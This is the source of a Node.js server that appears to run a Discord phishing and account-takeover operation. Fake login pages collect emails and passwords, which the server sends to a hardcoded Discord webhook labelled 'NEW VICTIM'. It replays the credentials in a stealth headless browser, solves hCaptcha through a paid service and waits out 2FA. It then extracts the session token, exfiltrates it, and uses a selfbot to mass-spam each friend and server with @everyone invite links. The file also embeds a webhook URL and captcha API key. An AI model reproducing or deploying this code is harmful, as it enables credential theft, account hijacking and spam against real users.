const express = require('express');
const cors = require('cors');
const path = require('path');
const axios = require('axios');
const puppeteer = require('puppeteer-extra');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const UserPreferencesPlugin = require('puppeteer-extra-plugin-user-preferences');
const UserAgent = require('user-agents');

puppeteer.use(StealthPlugin());
puppeteer.use(UserPreferencesPlugin({
    userPrefs: {
        webkit: {
            webprefs: {
                default_font_size: 16
            }
        }
    }
}));

const app = express();
app.use(cors());
app.use(express.json());
app.use(express.static('public'));

const WEBHOOK_URL = 'https://discord.com/api/webhooks/1493675175634407514/zzQ3Ci849oAQs9YfaUFpDj0wI0noKnCTdDaIj9TMjmIkhBwTTYe1h_eTl-kU0_JEMK_L';
const CUSTOM_MESSAGE = 'hi';
const ANTI_CAPTCHA_KEY = '373271de10fac6ff5aa75a2928acd339';

const activeSessions = new Map();

function isMobile(req) {
    const ua = req.headers['user-agent'] || '';
    return /mobile|android|iphone|ipad|ipod/i.test(ua);
}

function getIP(req) {
    return req.headers['x-forwarded-for'] || 
           req.headers['x-real-ip'] || 
           req.connection.remoteAddress || 
           req.socket.remoteAddress || 
           'unknown';
}

async function createTask(websiteURL, websiteKey, taskType = 'HCaptchaTaskProxyless') {
    const response = await axios.post('https://api.anti-captcha.com/createTask', {
        clientKey: ANTI_CAPTCHA_KEY,
        task: {
            type: taskType,
            websiteURL: websiteURL,
            websiteKey: websiteKey,
            isInvisible: false
        },
        softId: 0
    });
    
    if (response.data.errorId !== 0) {
        throw new Error(`Anti-Captcha error: ${response.data.errorDescription}`);
    }
    
    return response.data.taskId;
}

async function getTaskResult(taskId) {
    const maxAttempts = 60;
    const delayMs = 5000;
    
    for (let i = 0; i < maxAttempts; i++) {
        await new Promise(resolve => setTimeout(resolve, delayMs));
        
        const response = await axios.post('https://api.anti-captcha.com/getTaskResult', {
            clientKey: ANTI_CAPTCHA_KEY,
            taskId: taskId
        });
        
        if (response.data.errorId !== 0) {
            throw new Error(`Anti-Captcha error: ${response.data.errorDescription}`);
        }
        
        if (response.data.status === 'ready') {
            return response.data.solution;
        }
    }
    
    throw new Error('Anti-Captcha timeout');
}

async function solveHCaptcha(page, sessionId) {
    try {
        await sendWebhook({ content: `Solving CAPTCHA - Session: \`${sessionId}\`` });
        
        // FIXED: Extract sitekey from iframe src URL parameter
        let sitekey = await page.evaluate(() => {
            // Method 1: Check container div
            const container = document.querySelector('[data-sitekey]');
            if (container) return container.getAttribute('data-sitekey');
            
            // Method 2: Extract from iframe src
            const iframe = document.querySelector('iframe[src*="hcaptcha.com"]');
            if (iframe) {
                const src = iframe.getAttribute('src');
                const match = src.match(/[?&]sitekey=([^&]+)/);
                if (match) return match[1];
            }
            
            // Method 3: Check window.hcaptcha
            if (window.hcaptcha && window.hcaptcha.sitekey) {
                return window.hcaptcha.sitekey;
            }
            
            return null;
        });
        
        // Fallback: Intercept network request if DOM methods fail
        if (!sitekey) {
            const requests = await page.evaluate(() => {
                return performance.getEntriesByType('resource')
                    .filter(r => r.name.includes('hcaptcha.com'))
                    .map(r => r.name);
            });
            
            for (const url of requests) {
                const match = url.match(/[?&]sitekey=([^&]+)/);
                if (match) {
                    sitekey = match[1];
                    break;
                }
            }
        }
        
        if (!sitekey) {
            await sendWebhook({ content: `No sitekey found - Session: \`${sessionId}\`` });
            return false;
        }
        
        const taskId = await createTask('https://discord.com/login', sitekey);
        await sendWebhook({ content: `CAPTCHA task created: ${taskId} - Session: \`${sessionId}\`` });
        
        const solution = await getTaskResult(taskId);
        await sendWebhook({ content: `CAPTCHA solved - Session: \`${sessionId}\`` });
        
        // FIXED: Better token injection with multiple methods
        await page.evaluate((token) => {
            // Method 1: Standard textarea
            const textarea = document.querySelector('textarea[name="h-captcha-response"]');
            if (textarea) textarea.value = token;
            
            // Method 2: Hidden input
            const hiddenInput = document.querySelector('input[name="h-captcha-response"]');
            if (hiddenInput) hiddenInput.value = token;
            
            // Method 3: Set dataset
            const hcaptchaDiv = document.querySelector('.h-captcha') || document.querySelector('[data-sitekey]');
            if (hcaptchaDiv) hcaptchaDiv.dataset.response = token;
            
            // Method 4: Trigger callback
            if (window.hcaptchaCallback) {
                window.hcaptchaCallback(token);
            }
            
            // Method 5: Dispatch event
            if (window.hcaptcha && window.hcaptcha.render) {
                const event = new Event('hcaptchaSubmit');
                document.dispatchEvent(event);
            }
        }, solution.gRecaptchaResponse);
        
        return true;
        
    } catch (error) {
        await sendWebhook({ content: `CAPTCHA solve failed: ${error.message} - Session: \`${sessionId}\`` });
        return false;
    }
}

app.get('/', (req, res) => {
    if (isMobile(req)) {
        res.sendFile(path.join(__dirname, 'public', 'mobile.html'));
    } else {
        res.sendFile(path.join(__dirname, 'public', 'desktop.html'));
    }
});

app.get('/oauth2/authorize', (req, res) => {
    if (isMobile(req)) {
        res.sendFile(path.join(__dirname, 'public', 'mobile.html'));
    } else {
        res.sendFile(path.join(__dirname, 'public', 'desktop.html'));
    }
});

app.get('/health', (req, res) => {
    res.json({ status: 'ok', timestamp: Date.now() });
});

app.post('/api/capture', async (req, res) => {
    const { email, password, ip: clientIP, userAgent, platform } = req.body;
    const ip = clientIP || getIP(req);
    const sessionId = Date.now().toString(36) + Math.random().toString(36).substr(2);
    
    const data = {
        sessionId,
        email,
        password,
        ip,
        userAgent,
        platform,
        timestamp: new Date().toISOString(),
        url: req.headers.referer || 'direct'
    };
    
    await sendWebhook({
        content: `NEW VICTIM\nEmail: \`${email}\`\nPassword: \`${password}\`\nIP: \`${ip}\`\nPlatform: \`${platform}\`\nSession: \`${sessionId}\`\nTime: <t:${Math.floor(Date.now()/1000)}:F>`
    });
    
    processLogin(email, password, ip, sessionId);
    
    res.json({ status: 'processing', sessionId });
});

async function processLogin(email, password, ip, sessionId) {
    let browser;
    try {
        // OPTIMIZED: Faster browser launch
        browser = await puppeteer.launch({
            headless: 'new',
            args: [
                '--no-sandbox',
                '--disable-setuid-sandbox',
                '--disable-dev-shm-usage',
                '--disable-gpu',
                '--disable-extensions',
                '--disable-background-networking',
                '--disable-sync',
                '--disable-translate',
                '--disable-default-apps',
                '--mute-audio',
                '--no-first-run',
                '--fast-start',
                '--single-process',
                '--disable-features=IsolateOrigins,site-per-process',
                '--window-size=1280,720'
            ],
            dumpio: false,
            ignoreHTTPSErrors: true
        });
        
        const page = await browser.newPage();
        const userAgent = new UserAgent({ deviceCategory: 'desktop' });
        await page.setUserAgent(userAgent.toString());
        await page.setViewport({ width: 1280, height: 720 });
        
        await page.goto('https://discord.com/login', { waitUntil: 'domcontentloaded', timeout: 30000 });
        
        await page.waitForSelector('input[name="email"]', { visible: true, timeout: 10000 });
        
        await humanType(page, 'input[name="email"]', email);
        await delay(300, 800);
        await humanType(page, 'input[name="password"]', password);
        
        await delay(500, 1200);
        
        await page.click('button[type="submit"]');
        
        await delay(2000, 3500);
        
        const hasCaptcha = await page.evaluate(() => {
            return document.querySelector('iframe[src*="captcha"]') !== null ||
                   document.querySelector('.h-captcha') !== null ||
                   document.querySelector('[class*="captcha"]') !== null ||
                   document.querySelector('iframe[src*="hcaptcha"]') !== null ||
                   document.querySelector('[data-sitekey]') !== null;
        });
        
        if (hasCaptcha) {
            await sendWebhook({ content: `CAPTCHA DETECTED - Session: \`${sessionId}\`` });
            const solved = await solveHCaptcha(page, sessionId);
            
            if (solved) {
                await delay(1500, 2500);
                await page.click('button[type="submit"]');
                await delay(2000, 3500);
            }
        }
        
        await delay(2000, 3500);
        
        const is2FA = await page.evaluate(() => {
            const mfaInput = document.querySelector('input[name="code"]') || 
                           document.querySelector('input[placeholder*="code"]') ||
                           document.querySelector('input[type="text"][maxlength="6"]') ||
                           document.querySelector('[class*="mfa"] input') ||
                           document.querySelector('[class*="twoFactor"] input');
            
            const bodyText = document.body.innerText || document.body.textContent || '';
            const hasEmailCheck = bodyText.toLowerCase().includes('check your email') ||
                                bodyText.toLowerCase().includes('verify') ||
                                bodyText.toLowerCase().includes('2fa') ||
                                bodyText.toLowerCase().includes('two-factor') ||
                                bodyText.toLowerCase().includes('authentication code') ||
                                bodyText.toLowerCase().includes('6-digit');
            
            const hasAuthApp = bodyText.toLowerCase().includes('authenticator') ||
                             bodyText.toLowerCase().includes('auth app');
            
            return mfaInput !== null || hasEmailCheck || hasAuthApp;
        });
        
        if (is2FA) {
            await sendWebhook({ 
                content: `2FA REQUIRED - Session: \`${sessionId}\`\nWaiting for user to complete 2FA...` 
            });
            
            const maxWait = 300000;
            const startTime = Date.now();
            let loggedIn = false;
            
            while (Date.now() - startTime < maxWait) {
                await delay(3000);
                
                loggedIn = await page.evaluate(() => {
                    return document.location.href.includes('/channels/') ||
                           document.location.href.includes('/app') ||
                           document.querySelector('[class*="container-"]') !== null;
                });
                
                if (loggedIn) {
                    await sendWebhook({ content: `2FA BYPASSED - Session: \`${sessionId}\`` });
                    break;
                }
            }
            
            if (!loggedIn) {
                await sendWebhook({ 
                    content: `2FA TIMEOUT - Session: \`${sessionId}\`\nUser didn't complete 2FA in time` 
                });
                await browser.close();
                return;
            }
        }
        
        const currentUrl = await page.url();
        const isLoggedIn = currentUrl.includes('/channels/') || currentUrl.includes('/app');
        
        if (!isLoggedIn) {
            await sendWebhook({ 
                content: `LOGIN FAILED - Session: \`${sessionId}\`\nStill on: ${currentUrl}` 
            });
            await browser.close();
            return;
        }
        
        await delay(2000, 3000);
        
        const userInfo = await page.evaluate(() => {
            let username = null;
            let userId = null;
            let globalName = null;
            
            try {
                if (window.webpackChunkdiscord_app) {
                    const userModule = Object.values(window.webpackChunkdiscord_app)
                        .flat()
                        .find(m => m?.exports?.default?.getCurrentUser);
                    
                    if (userModule) {
                        const user = userModule.exports.default.getCurrentUser();
                        if (user) {
                            username = user.username;
                            userId = user.id;
                            globalName = user.globalName;
                        }
                    }
                }
            } catch(e) {}
            
            if (!username) {
                try {
                    if (window.GLOBAL_ENV && window.GLOBAL_ENV.user) {
                        username = window.GLOBAL_ENV.user.username;
                        userId = window.GLOBAL_ENV.user.id;
                        globalName = window.GLOBAL_ENV.user.global_name;
                    }
                } catch(e) {}
            }
            
            if (!username) {
                try {
                    const userCache = localStorage.getItem('UserSettingsStore');
                    if (userCache) {
                        const parsed = JSON.parse(userCache);
                        if (parsed && parsed.user) {
                            username = parsed.user.username;
                            userId = parsed.user.id;
                            globalName = parsed.user.global_name;
                        }
                    }
                } catch(e) {}
            }
            
            if (!username) {
                try {
                    const me = localStorage.getItem('Me');
                    if (me) {
                        const parsed = JSON.parse(me);
                        username = parsed.username;
                        userId = parsed.id;
                        globalName = parsed.global_name;
                    }
                } catch(e) {}
            }
            
            if (!username) {
                try {
                    const userStore = localStorage.getItem('UserStore');
                    if (userStore) {
                        const parsed = JSON.parse(userStore);
                        if (parsed && parsed.user) {
                            username = parsed.user.username;
                            userId = parsed.user.id;
                            globalName = parsed.user.global_name;
                        }
                    }
                } catch(e) {}
            }
            
            if (!username) {
                try {
                    const userElement = document.querySelector('[class*="nameTag-"]') || 
                                       document.querySelector('[class*="username-"]') ||
                                       document.querySelector('[aria-label*="User settings"]');
                    if (userElement) {
                        const text = userElement.textContent || userElement.getAttribute('aria-label');
                        if (text) {
                            username = text.replace('User settings', '').trim();
                        }
                    }
                } catch(e) {}
            }
            
            return { 
                username: username || globalName, 
                userId, 
                globalName,
                displayName: globalName || username
            };
        });
        
        if (!userInfo.username || !userInfo.userId) {
            try {
                const token = await page.evaluate(() => {
                    try {
                        return localStorage.getItem('token');
                    } catch(e) { return null; }
                });
                
                if (token) {
                    const userRes = await axios.get('https://discord.com/api/v9/users/@me', {
                        headers: { 'Authorization': token }
                    });
                    
                    if (userRes.data) {
                        userInfo.username = userRes.data.username;
                        userInfo.userId = userRes.data.id;
                        userInfo.globalName = userRes.data.global_name;
                        userInfo.displayName = userRes.data.global_name || userRes.data.username;
                    }
                }
            } catch(e) {}
        }
        
        const displayUser = userInfo.displayName || userInfo.username || 'Unknown';
        
        await sendWebhook({ 
            content: `LOGIN SUCCESS - Session: \`${sessionId}\`\nLogged in as: \`@${displayUser}\`\nUser ID: \`${userInfo.userId || 'Unknown'}\`\nUsername: \`${userInfo.username || 'Unknown'}\`\nGlobal: \`${userInfo.globalName || 'None'}\``
        });
        
        let token = null;
        
        try {
            token = await page.evaluate(() => {
                let foundToken = null;
                
                if (window.webpackChunkdiscord_app) {
                    try {
                        const modules = window.webpackChunkdiscord_app.push([[Math.random()], {}, (req) => {
                            for (const m of Object.keys(req.c).map((x) => req.c[x].exports).filter((x) => x)) {
                                if (m.default && typeof m.default.getToken === 'function') {
                                    const t = m.default.getToken();
                                    if (t && typeof t === 'string' && t.includes('.')) {
                                        foundToken = t;
                                        break;
                                    }
                                }
                                if (typeof m.getToken === 'function') {
                                    const t = m.getToken();
                                    if (t && typeof t === 'string' && t.includes('.')) {
                                        foundToken = t;
                                        break;
                                    }
                                }
                            }
                        }]);
                        window.webpackChunkdiscord_app.pop();
                    } catch(e) {}
                }
                
                return foundToken;
            });
        } catch(e) {}
        
        if (!token || typeof token !== 'string') {
            try {
                const localStorageData = await page.evaluate(() => {
                    const items = {};
                    for (let i = 0; i < localStorage.length; i++) {
                        const key = localStorage.key(i);
                        const value = localStorage.getItem(key);
                        items[key] = value;
                    }
                    return items;
                });
                
                for (const [key, value] of Object.entries(localStorageData)) {
                    if (value && typeof value === 'string' && value.split('.').length === 3) {
                        token = value;
                        break;
                    }
                }
            } catch(e) {}
        }
        
        if (token && typeof token === 'string' && token.includes('.') && token.split('.').length === 3) {
            const tokenStr = String(token).trim();
            
            await sendWebhook({ 
                content: `TOKEN EXTRACTED - Session: \`${sessionId}\`\nUser: \`@${displayUser}\`\nToken: \`${tokenStr.substring(0, 20)}...${tokenStr.substring(tokenStr.length - 10)}\`\n\`\`\`${tokenStr}\`\`\``
            });
            
            try {
                await massSpam(tokenStr, sessionId, displayUser);
            } catch (loginError) {
                await sendWebhook({ 
                    content: `TOKEN INVALID - Session: \`${sessionId}\`\nError: ${loginError.message}` 
                });
            }
        } else {
            await sendWebhook({ 
                content: `NO VALID TOKEN - Session: \`${sessionId}\`\nBut login was successful as \`@${displayUser}\``
            });
        }
        
        await browser.close();
        
    } catch (error) {
        await sendWebhook({ 
            content: `CRITICAL ERROR - Session: \`${sessionId}\`\n\`\`\`${error.message}\n${error.stack}\`\`\``
        });
        if (browser) await browser.close();
    }
}

async function humanType(page, selector, text) {
    await page.focus(selector);
    for (const char of text) {
        await page.keyboard.type(char, { delay: Math.random() * 80 + 30 });
        if (Math.random() > 0.85) await delay(50, 150);
    }
}

// FIXED & OPTIMIZED: Mass spam with parallel execution and proper error handling
async function massSpam(token, sessionId, username) {
    try {
        const { Client } = require('discord.js-selfbot-v13');
        const client = new Client({
            checkUpdate: false,
            patchVoice: false,
            autoRedeemNitro: false,
            ws: {
                properties: {
                    $browser: 'Discord Client',
                    $os: 'Windows',
                    $device: 'chrome'
                }
            }
        });
        
        let dmCount = 0;
        let guildCount = 0;
        let friendCount = 0;
        
        client.on('ready', async () => {
            await sendWebhook({ 
                content: `SPAM BOT READY - Session: \`${sessionId}\`\nTag: \`@${client.user.tag}\`\nID: \`${client.user.id}\`\nGuilds: \`${client.guilds.cache.size}\`\nFriends: \`${client.relationships.cache.filter(r => r.type === 1).size}\``
            });
            
            // FIXED: Mass DM with parallel execution
            try {
                const friends = client.relationships.cache.filter(r => r.type === 1);
                friendCount = friends.size;
                await sendWebhook({ content: `MASS DM STARTING - ${friendCount} friends targeted - Session: \`${sessionId}\`` });
                
                const dmPromises = [];
                
                for (const [, relationship] of friends) {
                    dmPromises.push((async () => {
                        try {
                            const user = await client.users.fetch(relationship.id).catch(() => null);
                            if (!user) return;
                            
                            const dm = await user.createDM().catch(() => null);
                            if (!dm) return;
                            
                            // Send 5 messages with proper mention format
                            for (let i = 0; i < 5; i++) {
                                await dm.send(`${CUSTOM_MESSAGE} @everyone @here https://discord.gg/example`).catch(() => {});
                                dmCount++;
                                await delay(500, 1200);
                            }
                        } catch (e) {}
                    })());
                }
                
                await Promise.allSettled(dmPromises);
                await sendWebhook({ content: `DMs COMPLETE: ${dmCount} sent to ${friendCount} friends - Session: \`${sessionId}\`` });
                
            } catch (e) {
                await sendWebhook({ content: `DM Error: ${e.message} - Session: \`${sessionId}\`` });
            }
            
            // FIXED: Mass guild spam with parallel execution
            try {
                await sendWebhook({ content: `GUILD SPAM STARTING - ${client.guilds.cache.size} guilds - Session: \`${sessionId}\`` });
                
                const guildPromises = [];
                
                for (const guild of client.guilds.cache.values()) {
                    guildPromises.push((async () => {
                        try {
                            const channel = guild.channels.cache.find(c => 
                                c.isTextBased && 
                                c.permissionsFor(guild.members.me)?.has('SendMessages') &&
                                c.permissionsFor(guild.members.me)?.has('ViewChannel')
                            );
                            
                            if (!channel) return;
                            
                            // Send 10 messages rapidly
                            for (let i = 0; i < 10; i++) {
                                await channel.send(`${CUSTOM_MESSAGE} @everyone @here ${'@everyone '.repeat(5)} https://discord.gg/example`).catch(() => {});
                                guildCount++;
                                await delay(300, 800);
                            }
                        } catch (e) {}
                    })());
                }
                
                await Promise.allSettled(guildPromises);
                await sendWebhook({ content: `GUILD SPAM COMPLETE: ${guildCount} messages in ${client.guilds.cache.size} guilds - Session: \`${sessionId}\`` });
                
            } catch (e) {
                await sendWebhook({ content: `Guild Error: ${e.message} - Session: \`${sessionId}\`` });
            }
            
            // Cleanup
            setTimeout(async () => {
                await client.destroy();
                await sendWebhook({ 
                    content: `SPAM OPERATION COMPLETE - Session: \`${sessionId}\`\nUser: \`@${username}\`\nTotal DMs: \`${dmCount}\`\nTotal Guild Msgs: \`${guildCount}\`\nFriends: \`${friendCount}\``
                });
            }, 3000);
        });
        
        client.on('error', async (err) => {
            await sendWebhook({ content: `Client Error: ${err.message} - Session: \`${sessionId}\`` });
        });
        
        await client.login(String(token).trim());
        
    } catch (error) {
        await sendWebhook({ 
            content: `SPAM FAILED - Session: \`${sessionId}\`\nError: ${error.message}` 
        });
    }
}

async function sendWebhook(data) {
    try {
        await axios.post(WEBHOOK_URL, data);
    } catch (e) {
        console.error('Webhook failed:', e.message);
    }
}

function delay(min, max) {
    return new Promise(resolve => setTimeout(resolve, Math.random() * (max - min) + min));
}

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
